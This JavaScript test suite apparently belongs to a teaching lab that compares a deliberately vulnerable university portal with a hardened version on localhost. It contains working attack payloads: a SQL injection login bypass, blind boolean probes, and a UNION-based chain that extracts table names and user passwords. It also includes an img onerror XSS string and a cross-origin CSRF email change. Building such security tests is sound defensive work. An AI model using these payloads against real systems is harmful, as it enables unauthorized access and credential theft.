/**
 * Executes genuine end-to-end HTTP tests against BOTH running servers with MySQL.
 * No fake DB, stub, mocked SQL, or hard-coded API responses are used.
 * Requirements: schema.sql imported, ports 3001 and 3002 running, Node >= 20.
 * Test reviews are persisted; re-run schema.sql to reset test data.
 */
import assert from 'node:assert/strict';

const V = 'http://127.0.0.1:3001';
const S = 'http://127.0.0.1:3002';
let count = 0;
const suite = [];

async function request(base, endpoint, { method = 'GET', body, csrf, cookie, origin, form = false } = {}) {
    const headers = {};
    if (csrf) headers['CSRF-Token'] = csrf;
    if (cookie) headers['Cookie'] = cookie;
    if (origin) headers['Origin'] = origin;
    if (body !== undefined) headers['Content-Type'] = form ? 'application/x-www-form-urlencoded' : 'application/json';
    const url = base + endpoint;
    const response = await fetch(url, {
        method, headers,
        body: body === undefined ? undefined : (form ? new URLSearchParams(body).toString() : JSON.stringify(body)),
        redirect: 'manual'
    });
    const text = await response.text();
    let data;
    try { data = JSON.parse(text); } catch { data = text; }
    return { status: response.status, data, headers: response.headers,
        cookie: response.headers.get('set-cookie')?.split(';')[0] || cookie };
}
function test(label, fn) { suite.push({ label, fn }); }
function expectCode(response, code) { assert.equal(response.status, code, JSON.stringify(response.data)); }
const xss = '<img src=x onerror="alert(99)">';
const enc = s => encodeURIComponent(s);
let safeSession, vulnSession;

// Test dependency initialization gets actual live sessions from the servers.
test('servers respond and each database is reachable', async () => {
    const v = await request(V, '/api/health');
    const s = await request(S, '/api/health');
    expectCode(v, 200); expectCode(s, 200);
    assert.equal(v.data.database, 'ok'); assert.equal(s.data.database, 'ok');
});

test('EASY SQLi: vulnerable login bypasses credentials', async () => {
    const r = await request(V, '/api/login', { method: 'POST', body: { username:"' OR '1'='1' -- -", password:'WRONG' } });
    expectCode(r, 200); assert.equal(r.data.success, true);
    assert.equal(r.data.user.username, 'admin');
});

test('safe login rejects identical SQL injection', async () => {
    const t = await request(S, '/api/csrf-token');
    expectCode(t, 200);
    const r = await request(S, '/api/login', { method: 'POST', cookie:t.cookie,
        csrf:t.data.csrfToken, body: { username:"' OR '1'='1' -- -", password:'WRONG' } });
    expectCode(r, 401); assert.equal(r.data.success, false);
});

test('real logins and separated session cookies both work', async () => {
    const v = await request(V, '/api/login', { method:'POST', body:{username:'alice_s', password:'alice123'} });
    expectCode(v, 200); vulnSession = { cookie:v.cookie };
    const t = await request(S, '/api/csrf-token');
    const s = await request(S, '/api/login', { method:'POST', cookie:t.cookie, csrf:t.data.csrfToken,
        body:{username:'alice_s',password:'alice123'} });
    expectCode(s, 200); safeSession = { cookie:s.cookie, csrf:s.data.csrfToken };
    assert.ok(vulnSession.cookie.startsWith('uni.vulnerable.sid='));
    assert.ok(safeSession.cookie.startsWith('uni.safe.sid='));
});

test('normal search and enrollment dashboard work in both versions', async () => {
    for (const base of [V,S]) {
        const search = await request(base, '/api/courses/search?q=Data');
        expectCode(search,200);assert.ok(search.data.some(x=>x.code==='CS201' || x.code==='CS301'));
        const login = base===V?vulnSession:safeSession;
        const enroll = await request(base,'/api/my-enrollments',{cookie:login.cookie});
        expectCode(enroll,200);assert.ok(enroll.data.length>=1);
    }
});

test('INTERMEDIATE SQLi: true and false blind probes reveal one bit only', async () => {
    const prefix="%' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='";
    const trueRes = await request(V, '/api/courses/availability?q='+enc(prefix+'a'+"' -- -"));
    const falseRes= await request(V, '/api/courses/availability?q='+enc(prefix+'z'+"' -- -"));
    expectCode(trueRes, 200);expectCode(falseRes,200);
    assert.deepEqual(trueRes.data,{ available:true });
    assert.deepEqual(falseRes.data,{ available:false });
    const safe = await request(S, '/api/courses/availability?q='+enc(prefix+'a'+"' -- -"));
    expectCode(safe,200); assert.deepEqual(safe.data,{available:false});
});

test('ADVANCED SQLi: column-count enumeration succeeds/fails at 5/6', async () => {
    const good=await request(V,'/api/courses/'+enc('1 ORDER BY 5 -- -'));
    const bad=await request(V,'/api/courses/'+enc('1 ORDER BY 6 -- -'));
    expectCode(good,200);assert.ok(good.data.length>=1);
    expectCode(bad,500);
});

test('ADVANCED SQLi: database, table, columns, user data extracted in order', async () => {
    const steps=[
        ['0 UNION SELECT 900,DATABASE(),\'database\',0,0 -- -',r=>r.code==='university_portal_vulnerable'],
        ['0 UNION SELECT 901,table_schema,table_name,0,0 FROM information_schema.tables WHERE table_schema=DATABASE() -- -',r=>r.title==='users'],
        ["0 UNION SELECT 902,table_name,column_name,0,0 FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' -- -",r=>r.title==='password'],
        ['0 UNION SELECT 903,username,password,0,0 FROM users -- -',r=>r.code==='admin' && r.title==='admin123']
    ];
    for (const [payload, predicate] of steps) {
        const r=await request(V,'/api/courses/'+enc(payload));
        expectCode(r,200);
        assert.ok(r.data.some(predicate),`No expected row for payload ${payload}: ${JSON.stringify(r.data)}`);
    }
});

test('safe course detail rejects full advanced chain and valid detail still works', async () => {
    const attack=await request(S,'/api/courses/'+enc('0 UNION SELECT 903,username,password,0,0 FROM users -- -'));
    expectCode(attack,400);
    const valid=await request(S,'/api/courses/1');expectCode(valid,200);
    assert.equal(valid.data[0].code,'CS101');
});

test('REFLECTED XSS: vulnerable HTML includes markup; safe returns text/plain', async () => {
    const a=await request(V,'/api/greet?name='+enc(xss));
    const b=await request(S,'/api/greet?name='+enc(xss));
    expectCode(a,200);expectCode(b,200);
    assert.match(a.headers.get('content-type'),/text\/html/);
    assert.ok(a.data.includes(xss));
    assert.match(b.headers.get('content-type'),/text\/plain/);
    assert.ok(b.data.includes(xss));
    assert.ok(!b.headers.get('content-type').includes('html'));
});

test('STORED XSS: real DB persists review, safe endpoint needs CSRF and session', async () => {
    const v=await request(V,'/api/reviews',{method:'POST',body:{user_id:3,course_id:1,content:xss}});
    expectCode(v,200);
    const list=await request(V,'/api/reviews?course_id=1');
    expectCode(list,200);assert.ok(list.data.some(r=>r.id===v.data.id && r.content===xss));
    const denied=await request(S,'/api/reviews',{method:'POST',cookie:safeSession.cookie,
        body:{user_id:1,course_id:1,content:xss}});
    expectCode(denied,403);
    const allowed=await request(S,'/api/reviews',{method:'POST',cookie:safeSession.cookie,csrf:safeSession.csrf,
        body:{user_id:1,course_id:1,content:xss}});
    expectCode(allowed,200);
    const safeList=await request(S,'/api/reviews?course_id=1');
    expectCode(safeList,200);assert.ok(safeList.data.some(r=>r.id===allowed.data.id && r.content===xss && r.username==='alice_s'));
});

test('CSRF: cross-origin HTML form changes vulnerable email, safe returns 403', async () => {
    const beforeV=await request(V,'/api/me',{cookie:vulnSession.cookie});
    const beforeS=await request(S,'/api/me',{cookie:safeSession.cookie});
    expectCode(beforeV,200);expectCode(beforeS,200);
    const email='compromised@attacker.test';
    const headers={origin:'http://127.0.0.1:4000',form:true};
    const a=await request(V,'/api/change-email',{method:'POST',cookie:vulnSession.cookie,body:{email},...headers});
    expectCode(a,200);
    const b=await request(S,'/api/change-email',{method:'POST',cookie:safeSession.cookie,body:{email},...headers});
    expectCode(b,403);
    const afterV=await request(V,'/api/me',{cookie:vulnSession.cookie});
    const afterS=await request(S,'/api/me',{cookie:safeSession.cookie});
    assert.equal(afterV.data.email,email);
    assert.equal(afterS.data.email,beforeS.data.email);
    // Restore state (no database reset or rewrite of unrelated rows).
    const restore=await request(V,'/api/change-email',{method:'POST',cookie:vulnSession.cookie,body:{email:beforeV.data.email}});
    expectCode(restore,200);
});

test('safe authorized email change succeeds with real token', async () => {
    const r=await request(S,'/api/change-email',{method:'POST',cookie:safeSession.cookie,csrf:safeSession.csrf,
        body:{email:'safe-change@student.test'}});
    expectCode(r,200);
    const check=await request(S,'/api/me',{cookie:safeSession.cookie});
    assert.equal(check.data.email,'safe-change@student.test');
    const restore=await request(S,'/api/change-email',{method:'POST',cookie:safeSession.cookie,csrf:safeSession.csrf,
        body:{email:'alice@student.test'}});
    expectCode(restore,200);
});

test('safe security headers, CSRF logout, and allowed logout', async () => {
    const r=await request(S,'/');expectCode(r,200);
    assert.match(r.headers.get('content-security-policy'),/script-src 'self'/);
    assert.match(r.headers.get('x-content-type-options'),/nosniff/);
    const denied=await request(S,'/api/logout',{method:'POST',cookie:safeSession.cookie});
    expectCode(denied,403);
    const allowed=await request(S,'/api/logout',{method:'POST',cookie:safeSession.cookie,csrf:safeSession.csrf});
    expectCode(allowed,200);
});

for (const item of suite) {
    try { await item.fn(); ++count; console.log(`PASS ${count}/${suite.length}: ${item.label}`); }
    catch(e) { console.error(`FAIL: ${item.label}\n${e.stack}`); process.exitCode=1; break; }
}
console.log(`\n${count}/${suite.length} complete. Real MySQL required; no DB mocking was used.`);
